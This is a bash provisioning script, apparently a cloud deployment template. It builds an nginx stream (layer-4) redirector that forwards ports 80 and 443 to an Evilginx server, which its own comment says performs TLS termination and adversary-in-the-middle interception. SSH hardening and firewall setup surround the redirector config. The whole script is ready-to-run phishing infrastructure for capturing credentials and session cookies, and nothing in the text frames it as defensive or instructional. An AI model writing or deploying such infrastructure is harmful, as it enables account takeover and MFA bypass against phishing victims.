#!/usr/bin/env bash
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update -y
apt-get install -y nginx libnginx-mod-stream ufw

# --- SSH hardening ---
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# --- Host firewall ---
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

# --- L4 (stream) passthrough config ---
# IMPORTANT: this does NOT terminate TLS. It blindly forwards the raw
# TCP byte stream to Evilginx, which performs TLS termination + AiTM.
mkdir -p /etc/nginx/stream.d

# Ensure the stream block is loaded (Ubuntu loads the module via
# /etc/nginx/modules-enabled, installed by libnginx-mod-stream).
cat > /etc/nginx/stream.d/evilginx.conf <<STREAM
upstream evilginx_https {
    server ${evilginx_ip}:443;
}
upstream evilginx_http {
    server ${evilginx_ip}:80;
}

server {
    listen 443;
    proxy_pass evilginx_https;
    proxy_protocol off;       # Evilginx expects plain TCP, not PROXY protocol
    proxy_timeout 90s;
}

server {
    listen 80;
    proxy_pass evilginx_http;
    proxy_timeout 90s;
}
STREAM

# Wire the stream config into nginx.conf (stream {} lives at top level,
# not inside http {}). Append an include if not already present.
if ! grep -q "stream.d/\*.conf" /etc/nginx/nginx.conf; then
cat >> /etc/nginx/nginx.conf <<'NGINXCONF'

stream {
    include /etc/nginx/stream.d/*.conf;
}
NGINXCONF
fi

nginx -t && systemctl restart nginx

echo "Evilginx L4 redirector provisioned: $(date -u)" > /var/log/provision-status.log
